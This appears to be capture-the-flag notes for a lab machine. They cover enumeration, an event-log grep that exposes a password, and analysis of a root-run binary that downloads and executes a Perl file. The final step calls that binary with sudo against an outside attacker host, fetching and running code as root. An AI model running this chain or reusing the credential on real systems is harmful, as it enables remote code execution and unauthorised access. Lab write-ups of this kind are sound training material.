Investigation

# Enumeration
## Web
### /analysed_images
Exiftool 12.37

# www-data
Cron:
```bash
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*
```

/usr/local/investigation/Windows\ Event\ Logs\ for\ Analysis.msg
$ extract_msg Windows\ Event\ Logs\ for\ Analysis.msg

## Log file
Events
    Event
        System
          Provider
          EventID
          Version
          Level
          Task
          Opcode
          Keywords
          TimeCreated
          EventRecordID
          Correlation
          Execution
          Channel
          Computer
          Security
        EventData
          Data
          Data
          Data
          Data
          Data
          Data
          Data

```bash
$ cat security.xml | grep "SubjectUserName" | sort --unique
<Data Name="SubjectUserName">AAnderson</Data>
<Data Name="SubjectUserName">DWM-1</Data>
<Data Name="SubjectUserName">DWM-2</Data>
<Data Name="SubjectUserName">DWM-3</Data>
<Data Name="SubjectUserName">DWM-4</Data>
<Data Name="SubjectUserName">DWM-5</Data>
<Data Name="SubjectUserName">DWM-6</Data>
<Data Name="SubjectUserName">DWM-7</Data>
<Data Name="SubjectUserName">DWM-8</Data>
<Data Name="SubjectUserName">DWM-9</Data>
<Data Name="SubjectUserName">EFORENZICS-DI$</Data>
<Data Name="SubjectUserName">HMarley</Data>
<Data Name="SubjectUserName">LJenkins</Data>
<Data Name="SubjectUserName">LMonroe</Data>
<Data Name="SubjectUserName">LOCAL SERVICE</Data>
<Data Name="SubjectUserName">SMorton</Data>
<Data Name="SubjectUserName">SYSTEM</Data>
<Data Name="SubjectUserName">UMFD-1</Data>
<Data Name="SubjectUserName">UMFD-2</Data>
<Data Name="SubjectUserName">UMFD-3</Data>
<Data Name="SubjectUserName">UMFD-4</Data>
<Data Name="SubjectUserName">UMFD-5</Data>
<Data Name="SubjectUserName">UMFD-6</Data>
<Data Name="SubjectUserName">UMFD-7</Data>
<Data Name="SubjectUserName">UMFD-8</Data>
<Data Name="SubjectUserName">UMFD-9</Data>
<SubjectUserName>SMorton</SubjectUserName>
```

MICROSOFT_AUTHENTICATION_PA
Found passwords: Def@ultf0r3nz!csPa$$

# Smorton
## Binary
Checks:
 - Needs 2 arguments
 - Needs to run as UID 0
 - 2nd args needs to be lDnxUysaQn

Functionality
 - Reads something from 2nd arg (file)
 - Curls something (File transfer to 1st arg)
 - Check if filetransfer successfull?
     - Empty lDnxUysaQn file (format string)
     - Malloc lDnxUysaQn (0x0000202a)
     - perl ./lDnxUysaQn ? 
     - Deleted lDnxUysaQn afterwards

# Root
$ sudo /usr/bin/binary http://10.10.16.4:9003 lDnxUysaQn
